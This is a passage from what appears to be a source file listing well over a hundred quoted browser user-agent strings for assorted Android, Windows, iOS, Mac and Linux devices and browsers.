		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18898",
		"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; KOB-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; CrOS armv7l 9592.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; SM-G955N Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7",
		"Mozilla/5.0 (X11; CrOS x86_64 10122.139.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3265.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900H) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)",
		"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo K920 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (Linux; Android 9; SM-J720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; LG-V500 Build/KOT49I.V50020f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 OPR/44.0.2510.1159",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.90",
		"Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.2.2; SM-T111 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; IF9007 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A405FM Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.103 YaBrowser/18.7.1.595.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 YaBrowser/19.4.5.141.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; Lenovo A2010-a Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A305FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
		"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a46) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; LLD-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G928T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 4.2.2; GSmart Roma R2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0.1; LG-H324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
		"Mozilla/5.0 (Linux; Android 9; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; CPH1969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Spice F301 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/54.0.204505792 Mobile/16G102 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/65.0.3325.152 Mobile/16G102 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI M2-A01L Build/HUAWEIM2-A01L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; S4Z Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900FD) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-S5282 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		"Mozilla/5.0 (Linux; Android 7.0; P00L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Ixion ML350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-P601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857",
		"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.2.338.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0.2; SGP621) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
		"Mozilla/5.0 (Linux; arm_64; Android 7.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; X55 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Power Plus 3 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/12.0 YaBrowser/18.4.3.119.10 Mobile/16F203 Safari/604.1",
		"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; v89_gq2008s Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		"Mozilla/5.0 (Linux; Android 7.0; Moto C Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.1; NX591J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2019RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0.2; LG-H522) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; LG-M210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; JSN-L42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; moto e6 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Nokia 5.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.167",
		"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-G9500 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; SM-J710GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; LYO-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.56 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; K016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; YAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; IMPRESS CLICK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG-SM-J727A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/75.3.60 like Chrome/75.0.3770.101 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
		"Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.172",
		"Mozilla/5.0 (Linux; Android 7.1.1; CPH1719) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2991.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; MYA-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; Ilium X110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 ArcticFox/27.9.19",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
		"Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Avast/77.2.2167.120",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3066.82",
		"Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; BQ-5512L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; BV5800Pro_RU Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; F3111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 10_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B72 Zalo iOS / 278",
		"Mozilla/5.0 (Linux; Android 6.0; Hisense L675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-T331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; M5 Note) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
